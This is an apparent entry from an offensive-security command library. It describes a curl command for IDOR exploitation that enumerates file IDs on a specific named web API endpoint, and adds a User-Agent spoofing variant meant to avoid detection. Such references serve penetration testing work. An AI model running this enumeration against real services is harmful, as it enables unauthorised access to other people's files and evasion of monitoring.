---
data: 'curl -s -o file_${ID}.json https://gdc.game.line.me/api/files/${ID}'
tags:
  - web
  - recon
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 882d1096-bc64-4181-9308-431352ed3b25
created_at: '2025-12-14T17:31:31.062Z'
updated_at: '2025-12-14T17:31:31.062Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-file-by-id

## Command

```bash
curl -s -o file_${ID}.json https://gdc.game.line.me/api/files/${ID}
```

## Description

This command uses curl to silently fetch a file from a web API endpoint by its identifier (ID), saving the response to a local file. It is used in IDOR exploitation to test access to unauthorized resources without verbose output during automation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode (suppress progress meter) | Yes |
| `-o` | Output file name with ID placeholder | Yes |
| `${ID}` | The file identifier to fetch (e.g., 123) | Yes |
| URL | Target endpoint (e.g., https://gdc.game.line.me/api/files/${ID}) | Yes |

## Examples

### Basic Usage

```bash
curl -s -o test_file.json https://gdc.game.line.me/api/files/123
```

Fetches file ID 123 and saves as test_file.json.

### Advanced Usage

```bash
curl -s -H "User-Agent: Mozilla/5.0" -o file_456.json https://gdc.game.line.me/api/files/456
```

Includes a custom header to mimic browser requests and avoid basic detection.

## Expected Output

Successful execution downloads the file content to the specified output file if the ID is accessible (HTTP 200). Failure (e.g., 404 or 403) results in an empty file or error code. Check with `ls -la file_*.json` to confirm downloads.

## Related

- [[Related Procedure: Exploit-IDOR-via-Brute-Force-on-File-Identifiers]]
